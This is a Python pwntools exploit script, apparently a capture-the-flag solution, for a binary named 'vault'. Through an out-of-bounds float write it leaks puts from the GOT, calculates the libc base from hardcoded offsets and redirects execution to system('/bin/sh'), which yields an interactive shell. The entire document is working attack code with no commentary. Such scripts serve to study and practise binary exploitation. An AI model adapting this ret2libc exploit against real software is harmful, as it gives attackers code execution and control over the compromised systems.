from pwn import *
import struct

e = ELF('./vault')
p = process('./vault')

gotputs = p32(e.got['puts'])[::-1]
puts = p32(e.plt['puts'])[::-1]
main = p32(e.symbols['main'])[::-1]
distance = 26
print p.recvuntil('> ')
print 'distance =',distance
print repr(puts),repr(gotputs),repr(main)

payload = '2\n'+str(distance)+'\n'+str(struct.unpack('!f',puts)[0])
p.sendline(payload)
print payload
print p.recvuntil('> ')
#pause()
payload = '2\n'+str(distance+1)+'\n'+str(struct.unpack('!f',main)[0])
p.sendline(payload)
print payload
print p.recvuntil('> ')
payload = '2\n'+str(distance+2)+'\n'+str(struct.unpack('!f',gotputs)[0])
print payload
p.sendline(payload)
print p.recvuntil('baru : ')

#p.recvuntil('baru : ')
#print repr(p.recvline())
log.info('Leaking libc')

#p.interactive()

puts_addr = int(u32(p.recvn(4)))
#puts_addr = p.recvline()[4:8]
#puts_addr = u32(puts_addr)
print 'puts =', hex(puts_addr)

#
offset_system = 0x0003e8f0
offset_dup2 = 0x000e9930
offset_read = 0x000e8cf0
offset_write = 0x000e8d90
offset_str_bin_sh = 0x17faaa
offset_puts = 0x00069930
# 
libc_base = puts_addr - offset_puts
libc_system = libc_base + offset_system
libc_str_bin_sh = libc_base + offset_str_bin_sh
print libc_system, libc_str_bin_sh
payload = '2\n'+str(distance)+'\n'+str(struct.unpack('!f',str(hex(libc_system))[2:].decode('hex'))[0])
print str(hex(libc_system))[2:].decode('hex')
p.sendline(payload)
payload = '2\n'+str(distance+1)+'\n'+str(struct.unpack('!f',main)[0])
p.sendline(payload)
payload = '2\n'+str(distance+2)+'\n'+str(struct.unpack('!f',str(hex(libc_str_bin_sh))[2:].decode('hex'))[0])
print str(hex(libc_str_bin_sh))[2:].decode('hex')
p.sendline(payload)

p.interactive()